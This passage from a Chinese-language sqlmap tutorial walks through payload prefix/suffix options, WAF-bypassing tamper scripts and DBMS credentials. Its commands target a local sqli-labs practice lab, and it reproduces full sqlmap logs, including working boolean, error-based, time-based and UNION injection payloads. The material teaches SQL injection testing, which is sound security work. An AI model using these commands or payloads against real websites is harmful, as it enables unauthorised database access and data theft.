python sqlmap.py -u "http://ip/sqlmap/mysql/get_str_brackets.php\
?id=1" -p id --prefix "')" --suffix " AND ('abc'='abc"

# 以上两句相当于
$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";
1234567
```

进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -p id --prefix "')" --suffix " AND ('abc'='abc"
1
```

打印

```shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:38:09 /2020-03-01/

[10:38:09] [INFO] testing connection to the target URL
[10:38:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:38:09] [INFO] testing if the target URL content is stable
[10:38:10] [INFO] target URL content is stable
[10:38:10] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[10:38:10] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[10:38:10] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[10:38:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:38:12] [WARNING] reflective value(s) found and filtering out
[10:38:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:38:12] [INFO] testing 'Generic inline queries'
[10:38:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:38:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:38:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[10:38:12] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:38:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[10:38:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[10:38:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[10:38:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[10:38:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[10:38:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[10:38:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[10:38:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[10:38:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[10:38:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[10:38:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[10:38:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[10:38:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[10:38:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[10:38:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[10:38:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[10:38:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[10:38:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[10:38:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:38:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:38:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:38:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:38:12] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:38:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:38:12] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:38:13] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:38:13] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:38:13] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[10:38:13] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:38:13] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:38:13] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:38:13] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:38:13] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:38:13] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[10:38:13] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[10:38:13] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[10:38:13] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[10:38:13] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[10:38:13] [INFO] testing 'MySQL inline queries'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:38:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:38:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[10:38:13] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
[10:38:13] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
[10:38:13] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
[10:38:13] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[10:38:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[10:38:13] [INFO] testing 'MySQL AND time-based blind (ELT)'
[10:38:13] [INFO] testing 'MySQL OR time-based blind (ELT)'
[10:38:13] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[10:38:13] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[10:38:13] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:38:14] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:38:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[10:38:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[10:38:14] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'
[10:38:14] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[10:38:14] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[10:38:14] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[10:38:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[10:38:14] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]

[10:38:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:38:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[10:38:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[10:38:15] [WARNING] GET parameter 'id' does not seem to be injectable
[10:38:15] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 10:38:15 /2020-03-01/

                                                                                                                                                                                                                                                                                                                                           
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125
```

### 5.Sqlmap设置Tamper脚本

除了单引号之间的字符串被CHAR()类似的表示形式所取代之外，sqlmap本身不会混淆发送的有效负载；
sqlmap通过Tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。
在自定义注入负载位置时提示使用–tamper参数，现增加参数进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -p id --prefix "')" --suffix " AND ('abc'='abc" --tamper=space2comment --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:46:09 /2020-03-01/

[10:46:09] [INFO] loading tamper module 'space2comment'
[10:46:09] [INFO] testing connection to the target URL
[10:46:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:46:09] [INFO] testing if the target URL content is stable
[10:46:10] [INFO] target URL content is stable
[10:46:10] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[10:46:10] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[10:46:10] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[10:46:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:46:12] [WARNING] reflective value(s) found and filtering out
[10:46:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:46:12] [INFO] testing 'Generic inline queries'
[10:46:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:46:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:46:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[10:46:12] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:46:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[10:46:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[10:46:12] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[10:46:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[10:46:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[10:46:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[10:46:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[10:46:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[10:46:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[10:46:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[10:46:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[10:46:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[10:46:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[10:46:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[10:46:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[10:46:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[10:46:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[10:46:14] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[10:46:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:46:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:46:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:46:14] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:46:14] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:46:14] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:46:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:46:14] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:46:14] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:46:14] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[10:46:14] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:46:14] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:46:14] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:46:14] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:46:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:46:14] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[10:46:14] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[10:46:14] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[10:46:14] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[10:46:14] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[10:46:14] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[10:46:14] [INFO] testing 'MySQL inline queries'
[10:46:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:46:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:46:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:46:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:46:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:46:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:46:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[10:46:15] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
[10:46:15] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
[10:46:15] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
[10:46:15] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[10:46:15] [INFO] testing 'MySQL AND time-based blind (ELT)'
[10:46:15] [INFO] testing 'MySQL OR time-based blind (ELT)'
[10:46:15] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[10:46:15] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[10:46:15] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:46:15] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[10:46:15] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'
[10:46:15] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[10:46:15] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[10:46:15] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[10:46:15] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[10:46:15] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]

[10:46:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:46:16] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[10:46:16] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[10:46:16] [WARNING] GET parameter 'id' does not seem to be injectable
[10:46:16] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests

[*] ending @ 10:46:16 /2020-03-01/

                                                                                                                                                                                                                                                                                                                               
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126
```

### 6.Sqlmap设置DBMS认证

设置DBMS认证方式通过以下命令：
`--dbms-cred = username:password`
这个功能其实是一个鸡肋，如果已经知道数据库的用户名和密码，就不需要再进行探测了嘛，直接连接数据库就OK了。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1 --dbms-cred="root:root" --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:55:37 /2020-03-01/

[10:55:37] [INFO] testing connection to the target URL
[10:55:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:55:37] [INFO] testing if the target URL content is stable
[10:55:38] [INFO] target URL content is stable
[10:55:38] [INFO] testing if GET parameter 'id' is dynamic
[10:55:38] [INFO] GET parameter 'id' appears to be dynamic
[10:55:38] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[10:55:38] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[10:55:38] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[10:55:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:55:40] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[10:55:40] [INFO] testing 'Generic inline queries'
[10:55:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:55:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:55:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:55:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:55:40] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:55:40] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:55:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:55:40] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[10:55:40] [INFO] testing 'MySQL inline queries'
[10:55:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:55:40] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
[10:55:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:55:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:55:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:55:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[10:55:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[10:55:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:55:50] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[10:55:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:55:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:55:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:55:50] [INFO] target URL appears to have 3 columns in query
[10:55:50] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 9058=9058 AND ('dhTu'='dhTu

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1') AND (SELECT 6167 FROM(SELECT COUNT(*),CONCAT(0x716a716a71,(SELECT (ELT(6167=6167,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('ETjb'='ETjb

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 4161 FROM (SELECT(SLEEP(5)))PeGx) AND ('WPLo'='WPLo

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-2145') UNION ALL SELECT NULL,NULL,CONCAT(0x716a716a71,0x5758644165596a476969716e597763436e4c506652536466735754476a73534a6a6b7776486c6f45,0x716b6a6b71)-- -
---
[10:55:56] [INFO] the back-end DBMS is MySQL
[10:55:56] [INFO] fetching banner
[10:55:56] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[10:55:56] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 10:55:56 /2020-03-01/

                                                                                                                                                                                                                                                                                                                       
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980
```

## 五、sqlmap注入技术参数

### 1.sqlmap设置具体SQL注入技术

参数：
`--technique`
此参数用于指定检测注入时所用技术，默认情况下Sqlmap会使用自己支持的全部技术进行检测；
此参数后跟表示检测技术的大写字母，其值为B、E、U、S、T或Q，含义如下：

- B：Boolean-based blind（布尔型注入）
- E：Error-based（报错型注入）
